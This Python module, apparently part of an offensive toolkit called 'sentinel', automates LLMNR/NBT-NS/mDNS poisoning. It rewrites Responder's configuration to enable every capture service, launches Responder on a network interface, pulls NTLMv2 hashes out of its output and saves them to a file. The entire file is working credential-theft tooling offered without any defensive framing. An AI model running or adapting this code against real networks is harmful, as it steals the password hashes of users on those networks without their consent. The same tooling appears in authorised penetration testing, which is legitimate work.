#!/usr/bin/env python3
"""
poison.py — LLMNR/NBT-NS/mDNS poisoning engine
Wraps Responder with config management and hash capture
"""

import asyncio
import configparser
import logging
import os
import re
import subprocess
from pathlib import Path

log = logging.getLogger("sentinel.poison")

RESPONDER_CONF_TEMPLATE = """
[Responder Core]
; Responder managed by sentinel
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
NNN = Off
"""

NTLMV2_PATTERN = re.compile(
    r"(\S+)::(\S+):(\w+):(\w+):(\w+)"
)


class PoisonEngine:
    def __init__(self, iface: str, output_dir: Path):
        self.iface = iface
        self.output_dir = output_dir
        self.hashes = []
        self.proc = None

    def _write_responder_conf(self):
        conf_path = Path("/etc/responder/Responder.conf")
        if conf_path.parent.exists():
            conf_path.write_text(RESPONDER_CONF_TEMPLATE)
            log.info("responder config written")
        else:
            log.warning("responder not found at /etc/responder — install with apt")

    async def start(self):
        self._write_responder_conf()
        log.info(f"starting LLMNR/NBT-NS poisoning on {self.iface}")

        try:
            self.proc = await asyncio.create_subprocess_exec(
                "responder", "-I", self.iface, "-wrf",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )

            async for line in self.proc.stdout:
                decoded = line.decode("utf-8", errors="replace").strip()
                log.debug(f"responder: {decoded}")

                match = NTLMV2_PATTERN.search(decoded)
                if match:
                    hash_str = ":".join(match.groups())
                    self.hashes.append(hash_str)
                    log.info(f"captured hash: {match.group(1)}::{match.group(2)}")
                    self._save_hash(hash_str)

        except FileNotFoundError:
            log.error("responder not found — install: apt install responder")
        except Exception as e:
            log.error(f"poison engine error: {e}")

    def _save_hash(self, hash_str: str):
        hashes_file = self.output_dir / "captured_hashes.txt"
        with open(hashes_file, "a") as f:
            f.write(hash_str + "\n")
        log.info(f"hash saved to {hashes_file}")

    async def stop(self):
        if self.proc:
            self.proc.terminate()
            await self.proc.wait()
            log.info("poison engine stopped")
